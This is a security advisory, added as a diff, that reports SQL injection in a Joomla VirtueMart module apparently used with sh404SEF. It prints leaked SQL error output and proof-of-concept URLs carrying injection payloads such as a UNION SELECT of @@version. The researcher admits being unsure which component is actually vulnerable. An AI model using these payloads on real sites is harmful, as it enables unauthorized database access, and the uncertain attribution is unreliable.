@@ -1,0 +1,49 @@
+[~]>> ...[BEGIN ADVISORY]...
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> TITLE: Joomla Module (Customers_who_bought...) SQL Injection Vulnerability 
+[~]>> LANGUAGE: PHP
+[~]>> DORK: N/A
+[~]>> RESEARCHER: B-HUNT3|2
+[~]>> CONTACT: bhunt3r[at_no_spam]gmail[dot_no_spam]com
+[~]>> TYPE: COMMERCIAL
+[~]>> PRICE: 14,95€
+[~]>> TESTED ON: Demo Site
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> DESCRIPTION: Test done against Customers_who_bought (VirtueMart Module) and sh404SEF Joomla component
+[~]>> Both Commercial Joomla extensions, so my researching is poor. Injection is done in url redirection
+[~]>> (View SQL errors) and result can be visible in source code, url, error page,...
+[~]>> Since sh404SEF is used I cann't detect affected vars, but also there are BSQLi.
+[~]>> Trying to search the module/component vulnerable, i've tested sh404SEF and VirtueMart. But Vulnerability
+[~]>> cann't reproduce. Probably issue is in Customers_who_bought Module (hence advisory title).
+[~]>> AFFECTED VERSIONS: Confirmed in 1.1 stable but probably other versions also
+[~]>> RISK: Medium/High
+[~]>> IMPACT: Execute Arbitrary SQL queries
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> SQL ERRORS:
+
+[~]>> Making an error --> Example: http://[SITE]/[JOOMLA_PATH]/%27%20AND%201=1
+
+No valid database connection You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY rank ASC LIMIT 1' at line 1 SQL=SELECT oldurl, newurl FROM jos_redirection WHERE oldurl = '[JOOMLA_PATH]' AND 1=1' ORDER BY rank ASC LIMIT 1
+No valid database connection You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY rank ASC LIMIT 1' at line 1 SQL=SELECT oldurl, newurl FROM jos_redirection WHERE oldurl = '[JOOMLA_PATH]' AND 1=1/' ORDER BY rank ASC LIMIT 1
+No valid database connection You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1 SQL=SELECT newurl FROM jos_sh404sef_aliases WHERE alias = '[JOOMLA_PATH]' AND 1=1'
+No valid database connection You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1 SQL=SELECT newurl FROM jos_sh404sef_aliases WHERE alias = '[JOOMLA_PATH]' AND 1=1'
+No valid database connection You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1 SQL=SELECT * FROM jos_redirection WHERE oldurl = '[JOOMLA_PATH]' AND 1=1'
+Array ( [0] => option [1] => [JOOMLA_PATH] [2] => ' AND 1=1 ) 
+
+[~]>> PROOF OF CONCEPT:
+
+[~]>> http://[SITE]/[JOOMLA_PATH]/[SQL]
+[~]>> http://[SITE]/[JOOMLA_PATH]/1%27%20union%20all%20select%20@@version
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> ...[END ADVISORY]...
+ 
